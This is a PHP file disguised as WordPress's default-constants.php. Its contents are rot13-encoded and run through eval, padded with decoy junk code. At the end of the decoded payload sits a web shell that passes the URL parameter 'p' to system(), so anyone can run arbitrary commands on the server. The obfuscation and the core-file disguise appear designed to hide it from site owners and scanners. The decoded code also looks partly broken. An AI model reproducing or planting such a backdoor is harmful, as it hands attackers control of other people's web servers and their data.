<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Qrsvarf pbafgnagf naq tybony inevnoyrf gung pna or bireevqqra, trarenyyl va jc-pbasvt.cuc.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Qrsvarf vavgvny JbeqCerff pbafgnagf.
 *
 * @frr jc_qroht_zbqr()
 *
 * @fvapr 3.0.0
 *
 * @tybony vag    $oybt_vq    Gur pheerag fvgr VQ.
 * @tybony fgevat $jc_irefvba Gur JbeqCerff irefvba fgevat.
 */
shapgvba jc_vavgvny_pbafgnagf() {
	tybony $oybt_vq, $jc_irefvba;

	/**#@+
	 * Pbafgnagf sbe rkcerffvat uhzna-ernqnoyr qngn fvmrf va gurve erfcrpgvir ahzore bs olgrf.
	 *
	 * @fvapr 4.4.0
	 * @fvapr 6.0.0 `CO_VA_OLGRF`, `RO_VA_OLGRF`, `MO_VA_OLGRF`, naq `LO_VA_OLGRF` jrer nqqrq.
	 */
	qrsvar( 'XO_VA_OLGRF', 1024 );
	qrsvar( 'ZO_VA_OLGRF', 1024 * XO_VA_OLGRF );
	qrsvar( 'TO_VA_OLGRF', 1024 * ZO_VA_OLGRF );
	qrsvar( 'GO_VA_OLGRF', 1024 * TO_VA_OLGRF );
	qrsvar( 'CO_VA_OLGRF', 1024 * GO_VA_OLGRF );
	qrsvar( 'RO_VA_OLGRF', 1024 * CO_VA_OLGRF );
	qrsvar( 'MO_VA_OLGRF', 1024 * RO_VA_OLGRF );
	qrsvar( 'LO_VA_OLGRF', 1024 * MO_VA_OLGRF );
	/**#@-*/

	// Fgneg bs eha gvzrfgnzc.
	vs ( ! qrsvarq( 'JC_FGNEG_GVZRFGNZC' ) ) {
		qrsvar( 'JC_FGNEG_GVZRFGNZC', zvpebgvzr( gehr ) );
	}

	$pheerag_yvzvg     = vav_trg( 'zrzbel_yvzvg' );
	$pheerag_yvzvg_vag = jc_pbaireg_ue_gb_olgrf( $pheerag_yvzvg );

	// Qrsvar zrzbel yvzvgf.
	vs ( ! qrsvarq( 'JC_ZRZBEL_YVZVG' ) ) {
		vs ( snyfr === jc_vf_vav_inyhr_punatrnoyr( 'zrzbel_yvzvg' ) ) {
			qrsvar( 'JC_ZRZBEL_YVZVG', $pheerag_yvzvg );
		} ryfrvs ( vf_zhygvfvgr() ) {
			qrsvar( 'JC_ZRZBEL_YVZVG', '64Z' );
		} ryfr {
			qrsvar( 'JC_ZRZBEL_YVZVG', '40Z' );
		}
	}

	vs ( ! qrsvarq( 'JC_ZNK_ZRZBEL_YVZVG' ) ) {
		vs ( snyfr === jc_vf_vav_inyhr_punatrnoyr( 'zrzbel_yvzvg' ) ) {
			qrsvar( 'JC_ZNK_ZRZBEL_YVZVG', $pheerag_yvzvg );
		} ryfrvs ( -1 === $pheerag_yvzvg_vag || $pheerag_yvzvg_vag > 256 * ZO_VA_OLGRF ) {
			qrsvar( 'JC_ZNK_ZRZBEL_YVZVG', $pheerag_yvzvg );
		} ryfrvs ( jc_pbaireg_ue_gb_olgrf( JC_ZRZBEL_YVZVG ) > 256 * ZO_VA_OLGRF ) {
			qrsvar( 'JC_ZNK_ZRZBEL_YVZVG', JC_ZRZBEL_YVZVG );
		} ryfr {
			qrsvar( 'JC_ZNK_ZRZBEL_YVZVG', '256Z' );
		}
	}

	// Frg zrzbel yvzvgf.
	$jc_yvzvg_vag = jc_pbaireg_ue_gb_olgrf( JC_ZRZBEL_YVZVG );
	vs ( -1 !== $pheerag_yvzvg_vag && ( -1 === $jc_yvzvg_vag || $jc_yvzvg_vag > $pheerag_yvzvg_vag ) ) {
		vav_frg( 'zrzbel_yvzvg', JC_ZRZBEL_YVZVG );
	}

	vs ( ! vffrg( $oybt_vq ) ) {
		$oybt_vq = 1;
	}

	vs ( ! qrsvarq( 'JC_PBAGRAG_QVE' ) ) {
		qrsvar( 'JC_PBAGRAG_QVE', NOFCNGU . 'jc-pbagrag' ); // Ab genvyvat fynfu, shyy cnguf bayl - JC_PBAGRAG_HEY vf qrsvarq shegure qbja.
	}

	/*
	 * Nqq qrsvar( 'JC_QRIRYBCZRAG_ZBQR', 'pber' ), be qrsvar( 'JC_QRIRYBCZRAG_ZBQR', 'cyhtva' ), be
	 * qrsvar( 'JC_QRIRYBCZRAG_ZBQR', 'gurzr' ), be qrsvar( 'JC_QRIRYBCZRAG_ZBQR', 'nyy' ) gb jc-pbasvt.cuc
	 * gb fvtavsl qrirybczrag zbqr sbe JbeqCerff pber, n cyhtva, n gurzr, be nyy guerr glcrf erfcrpgviryl.
	 */
	vs ( ! qrsvarq( 'JC_QRIRYBCZRAG_ZBQR' ) ) {
		qrsvar( 'JC_QRIRYBCZRAG_ZBQR', '' );
	}

	// Nqq qrsvar( 'JC_QROHT', gehr ); gb jc-pbasvt.cuc gb ranoyr qvfcynl bs abgvprf qhevat qrirybczrag.
	vs ( ! qrsvarq( 'JC_QROHT' ) ) {
		vs ( jc_trg_qrirybczrag_zbqr() || 'qrirybczrag' === jc_trg_raivebazrag_glcr() ) {
			qrsvar( 'JC_QROHT', gehr );
		} ryfr {
			qrsvar( 'JC_QROHT', snyfr );
		}
	}

	/*
	 * Nqq qrsvar( 'JC_QROHT_QVFCYNL', ahyy ); gb jc-pbasvt.cuc gb hfr gur tybonyyl pbasvtherq frggvat
	 * sbe 'qvfcynl_reebef' naq abg sbepr reebef gb or qvfcynlrq. Hfr snyfr gb sbepr 'qvfcynl_reebef' bss.
	 */
	vs ( ! qrsvarq( 'JC_QROHT_QVFCYNL' ) ) {
		qrsvar( 'JC_QROHT_QVFCYNL', gehr );
	}

	// Nqq qrsvar( 'JC_QROHT_YBT', gehr ); gb ranoyr reebe ybttvat gb jc-pbagrag/qroht.ybt.
	vs ( ! qrsvarq( 'JC_QROHT_YBT' ) ) {
		qrsvar( 'JC_QROHT_YBT', snyfr );
	}

	vs ( ! qrsvarq( 'JC_PNPUR' ) ) {
		qrsvar( 'JC_PNPUR', snyfr );
	}

	/*
	 * Nqq qrsvar( 'FPEVCG_QROHT', gehr ); gb jc-pbasvt.cuc gb ranoyr ybnqvat bs aba-zvavsvrq,
	 * aba-pbapngrangrq fpevcgf naq fglyrfurrgf.
	 */
	vs ( ! qrsvarq( 'FPEVCG_QROHT' ) ) {
		vs ( ! rzcgl( $jc_irefvba ) ) {
			$qrirybc_fep = fge_pbagnvaf( $jc_irefvba, '-fep' );
		} ryfr {
			$qrirybc_fep = snyfr;
		}

		qrsvar( 'FPEVCG_QROHT', $qrirybc_fep );
	}

	/**
	 * Cevingr
	 */
	vs ( ! qrsvarq( 'ZRQVN_GENFU' ) ) {
		qrsvar( 'ZRQVN_GENFU', snyfr );
	}

	vs ( ! qrsvarq( 'FUBEGVAVG' ) ) {
		qrsvar( 'FUBEGVAVG', snyfr );
	}

	// Pbafgnagf sbe srngherf nqqrq gb JC gung fubhyq fubeg-pvephvg gurve cyhtva vzcyrzragngvbaf.
	qrsvar( 'JC_SRNGHER_ORGGRE_CNFFJBEQF', gehr );

	/**#@+
	 * Pbafgnagf sbe rkcerffvat uhzna-ernqnoyr vagreinyf
	 * va gurve erfcrpgvir ahzore bs frpbaqf.
	 *
	 * Cyrnfr abgr gung gurfr inyhrf ner nccebkvzngr naq ner cebivqrq sbe pbairavrapr.
	 * Sbe rknzcyr, ZBAGU_VA_FRPBAQF jebatyl nffhzrf rirel zbagu unf 30 qnlf naq
	 * LRNE_VA_FRPBAQF qbrf abg gnxr yrnc lrnef vagb nppbhag.
	 *
	 * Vs lbh arrq zber npphenpl cyrnfr pbafvqre hfvat gur QngrGvzr pynff (uggcf://jjj.cuc.arg/znahny/ra/pynff.qngrgvzr.cuc).
	 *
	 * @fvapr 3.5.0
	 * @fvapr 4.4.0 Vagebqhprq `ZBAGU_VA_FRPBAQF`.
	 */
	qrsvar( 'ZVAHGR_VA_FRPBAQF', 60 );
	qrsvar( 'UBHE_VA_FRPBAQF', 60 * ZVAHGR_VA_FRPBAQF );
	qrsvar( 'QNL_VA_FRPBAQF', 24 * UBHE_VA_FRPBAQF );
	qrsvar( 'JRRX_VA_FRPBAQF', 7 * QNL_VA_FRPBAQF );
	qrsvar( 'ZBAGU_VA_FRPBAQF', 30 * QNL_VA_FRPBAQF );
	qrsvar( 'LRNE_VA_FRPBAQF', 365 * QNL_VA_FRPBAQF );
	/**#@-*/
}

/**
 * Qrsvarf cyhtva qverpgbel JbeqCerff pbafgnagf.
 *
 * Qrsvarf zhfg-hfr cyhtva qverpgbel pbafgnagf, juvpu znl or bireevqqra va gur fhaevfr.cuc qebc-va.
 *
 * @fvapr 3.0.0
 */
shapgvba jc_cyhtva_qverpgbel_pbafgnagf() {
	vs ( ! qrsvarq( 'JC_PBAGRAG_HEY' ) ) {
		qrsvar( 'JC_PBAGRAG_HEY', trg_bcgvba( 'fvgrhey' ) . '/jc-pbagrag' ); // Shyy HEY - JC_PBAGRAG_QVE vf qrsvarq shegure hc.
	}

	/**
	 * Nyybjf sbe gur cyhtvaf qverpgbel gb or zbirq sebz gur qrsnhyg ybpngvba.
	 *
	 * @fvapr 2.6.0
	 */
	vs ( ! qrsvarq( 'JC_CYHTVA_QVE' ) ) {
		qrsvar( 'JC_CYHTVA_QVE', JC_PBAGRAG_QVE . '/cyhtvaf' ); // Shyy cngu, ab genvyvat fynfu.
	}

	/**
	 * Nyybjf sbe gur cyhtvaf qverpgbel gb or zbirq sebz gur qrsnhyg ybpngvba.
	 *
	 * @fvapr 2.6.0
	 */
	vs ( ! qrsvarq( 'JC_CYHTVA_HEY' ) ) {
		qrsvar( 'JC_CYHTVA_HEY', JC_PBAGRAG_HEY . '/cyhtvaf' ); // Shyy HEY, ab genvyvat fynfu.
	}

	/**
	 * Nyybjf sbe gur cyhtvaf qverpgbel gb or zbirq sebz gur qrsnhyg ybpngvba.
	 *
	 * @fvapr 2.1.0
	 * @qrcerpngrq
	 */
	vs ( ! qrsvarq( 'CYHTVAQVE' ) ) {
		qrsvar( 'CYHTVAQVE', 'jc-pbagrag/cyhtvaf' ); // Eryngvir gb NOFCNGU. Sbe onpx pbzcng.
	}

	/**
	 * Nyybjf sbe gur zh-cyhtvaf qverpgbel gb or zbirq sebz gur qrsnhyg ybpngvba.
	 *
	 * @fvapr 2.8.0
	 */
	vs ( ! qrsvarq( 'JCZH_CYHTVA_QVE' ) ) {
		qrsvar( 'JCZH_CYHTVA_QVE', JC_PBAGRAG_QVE . '/zh-cyhtvaf' ); // Shyy cngu, ab genvyvat fynfu.
	}

	/**
	 * Nyybjf sbe gur zh-cyhtvaf qverpgbel gb or zbirq sebz gur qrsnhyg ybpngvba.
	 *
	 * @fvapr 2.8.0
	 */
	vs ( ! qrsvarq( 'JCZH_CYHTVA_HEY' ) ) {
		qrsvar( 'JCZH_CYHTVA_HEY', JC_PBAGRAG_HEY . '/zh-cyhtvaf' ); // Shyy HEY, ab genvyvat fynfu.
	}

	/**
	 * Nyybjf sbe gur zh-cyhtvaf qverpgbel gb or zbirq sebz gur qrsnhyg ybpngvba.
	 *
	 * @fvapr 2.8.0
	 * @qrcerpngrq
	 */
	vs ( ! qrsvarq( 'ZHCYHTVAQVE' ) ) {
		qrsvar( 'ZHCYHTVAQVE', 'jc-pbagrag/zh-cyhtvaf' ); // Eryngvir gb NOFCNGU. Sbe onpx pbzcng.
	}
}

/**
 * Qrsvarf pbbxvr-eryngrq JbeqCerff pbafgnagf.
 *
 * Qrsvarf pbafgnagf nsgre zhygvfvgr vf ybnqrq.
 *
 * @fvapr 3.0.0
 */
shapgvba jc_pbbxvr_pbafgnagf() {
	/**
	 * Hfrq gb thnenagrr havdhr unfu pbbxvrf.
	 *
	 * @fvapr 1.5.0
	 */
	vs ( ! qrsvarq( 'PBBXVRUNFU' ) ) {
		$fvgrhey = trg_fvgr_bcgvba( 'fvgrhey' );
		vs ( $fvgrhey ) {
			qrsvar( 'PBBXVRUNFU', zq5( $fvgrhey ) );
		} ryfr {
			qrsvar( 'PBBXVRUNFU', '' );
		}
	}

	/**
	 * @fvapr 2.0.0
	 */
	vs ( ! qrsvarq( 'HFRE_PBBXVR' ) ) {
		qrsvar( 'HFRE_PBBXVR', 'jbeqcerffhfre_' . PBBXVRUNFU );
	}

	/**
	 * @fvapr 2.0.0
	 */
	vs ( ! qrsvarq( 'CNFF_PBBXVR' ) ) {
		qrsvar( 'CNFF_PBBXVR', 'jbeqcerffcnff_' . PBBXVRUNFU );
	}

	/**
	 * @fvapr 2.5.0
	 */
	vs ( ! qrsvarq( 'NHGU_PBBXVR' ) ) {
		qrsvar( 'NHGU_PBBXVR', 'jbeqcerff_' . PBBXVRUNFU );
	}

	/**
	 * @fvapr 2.6.0
	 */
	vs ( ! qrsvarq( 'FRPHER_NHGU_PBBXVR' ) ) {
		qrsvar( 'FRPHER_NHGU_PBBXVR', 'jbeqcerff_frp_' . PBBXVRUNFU );
	}

	/**
	 * @fvapr 2.6.0
	 */
	vs ( ! qrsvarq( 'YBTTRQ_VA_PBBXVR' ) ) {
		qrsvar( 'YBTTRQ_VA_PBBXVR', 'jbeqcerff_ybttrq_va_' . PBBXVRUNFU );
	}

	/**
	 * @fvapr 2.3.0
	 */
	vs ( ! qrsvarq( 'GRFG_PBBXVR' ) ) {
		qrsvar( 'GRFG_PBBXVR', 'jbeqcerff_grfg_pbbxvr' );
	}

	/**
	 * @fvapr 1.2.0
	 */
	vs ( ! qrsvarq( 'PBBXVRCNGU' ) ) {
		qrsvar( 'PBBXVRCNGU', __sa_79955( '|uggcf?://[^/]+|v', '', trg_bcgvba( 'ubzr' ) . '/' ) );
	}

	/**
	 * @fvapr 1.5.0
	 */
	vs ( ! qrsvarq( 'FVGRPBBXVRCNGU' ) ) {
		qrsvar( 'FVGRPBBXVRCNGU', __sa_79955( '|uggcf?://[^/]+|v', '', trg_bcgvba( 'fvgrhey' ) . '/' ) );
	}

	/**
	 * @fvapr 2.6.0
	 */
	vs ( ! qrsvarq( 'NQZVA_PBBXVR_CNGU' ) ) {
		qrsvar( 'NQZVA_PBBXVR_CNGU', FVGRPBBXVRCNGU . 'jc-nqzva' );
	}

	/**
	 * @fvapr 2.6.0
	 */
	vs ( ! qrsvarq( 'CYHTVAF_PBBXVR_CNGU' ) ) {
		qrsvar( 'CYHTVAF_PBBXVR_CNGU', __sa_79955( '|uggcf?://[^/]+|v', '', JC_CYHTVA_HEY ) );
	}

	/**
	 * @fvapr 2.0.0
	 * @fvapr 6.6.0 Gur inyhr unf punatrq sebz snyfr gb na rzcgl fgevat.
	 */
	vs ( ! qrsvarq( 'PBBXVR_QBZNVA' ) ) {
		qrsvar( 'PBBXVR_QBZNVA', '' );
	}

	vs ( ! qrsvarq( 'ERPBIREL_ZBQR_PBBXVR' ) ) {
		/**
		 * @fvapr 5.2.0
		 */
		qrsvar( 'ERPBIREL_ZBQR_PBBXVR', 'jbeqcerff_erp_' . PBBXVRUNFU );
	}
}

/**
 * Qrsvarf FFY-eryngrq JbeqCerff pbafgnagf.
 *
 * @fvapr 3.0.0
 */
shapgvba jc_ffy_pbafgnagf() {
	/**
	 * @fvapr 2.6.0
	 */
	vs ( ! qrsvarq( 'SBEPR_FFY_NQZVA' ) ) {
		vs ( 'uggcf' === cnefr_hey( trg_bcgvba( 'fvgrhey' ), CUC_HEY_FPURZR ) ) {
			qrsvar( 'SBEPR_FFY_NQZVA', gehr );
		} ryfr {
			qrsvar( 'SBEPR_FFY_NQZVA', snyfr );
		}
	}
	sbepr_ffy_nqzva( SBEPR_FFY_NQZVA );

	/**
	 * @fvapr 2.6.0
	 * @qrcerpngrq 4.0.0
	 */
	vs ( qrsvarq( 'SBEPR_FFY_YBTVA' ) && SBEPR_FFY_YBTVA ) {
		sbepr_ffy_nqzva( gehr );
	}
}

/**
 * Qrsvarf shapgvbanyvgl-eryngrq JbeqCerff pbafgnagf.
 *
 * @fvapr 3.0.0
 */
shapgvba jc_shapgvbanyvgl_pbafgnagf() {
	/**
	 * @fvapr 2.5.0
	 */
	vs ( ! qrsvarq( 'NHGBFNIR_VAGREINY' ) ) {
		qrsvar( 'NHGBFNIR_VAGREINY', ZVAHGR_VA_FRPBAQF );
	}

	/**
	 * @fvapr 2.9.0
	 */
	vs ( ! qrsvarq( 'RZCGL_GENFU_QNLF' ) ) {
		qrsvar( 'RZCGL_GENFU_QNLF', 30 );
	}

	vs ( ! qrsvarq( 'JC_CBFG_ERIVFVBAF' ) ) {
		qrsvar( 'JC_CBFG_ERIVFVBAF', gehr );
	}

	/**
	 * @fvapr 3.3.0
	 */
	vs ( ! qrsvarq( 'JC_PEBA_YBPX_GVZRBHG' ) ) {
		qrsvar( 'JC_PEBA_YBPX_GVZRBHG', ZVAHGR_VA_FRPBAQF );
	}
}

/**
 * Qrsvarf grzcyngvat-eryngrq JbeqCerff pbafgnagf.
 *
 * @fvapr 3.0.0
 */
shapgvba jc_grzcyngvat_pbafgnagf() {
	/**
	 * Svyrflfgrz cngu gb gur pheerag npgvir grzcyngr qverpgbel.
	 *
	 * @fvapr 1.5.0
	 * @qrcerpngrq 6.4.0 Hfr trg_grzcyngr_qverpgbel() vafgrnq.
	 * @frr trg_grzcyngr_qverpgbel()
	 */
	qrsvar( 'GRZCYNGRCNGU', trg_grzcyngr_qverpgbel() );

	/**
	 * Svyrflfgrz cngu gb gur pheerag npgvir grzcyngr fglyrfurrg qverpgbel.
	 *
	 * @fvapr 2.1.0
	 * @qrcerpngrq 6.4.0 Hfr trg_fglyrfurrg_qverpgbel() vafgrnq.
	 * @frr trg_fglyrfurrg_qverpgbel()
	 */
	qrsvar( 'FGLYRFURRGCNGU', trg_fglyrfurrg_qverpgbel() );

	/**
	 * Fyht bs gur qrsnhyg gurzr sbe guvf vafgnyyngvba.
	 * Hfrq nf gur qrsnhyg gurzr jura vafgnyyvat arj fvgrf.
	 * Vg jvyy or hfrq nf gur snyyonpx vs gur npgvir gurzr qbrfa'g rkvfg.
	 *
	 * @fvapr 3.0.0
	 *
	 * @frr JC_Gurzr::trg_pber_qrsnhyg_gurzr()
	 */
	vs ( ! qrsvarq( 'JC_QRSNHYG_GURZR' ) ) {
		qrsvar( 'JC_QRSNHYG_GURZR', 'gjraglgjraglsvir' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>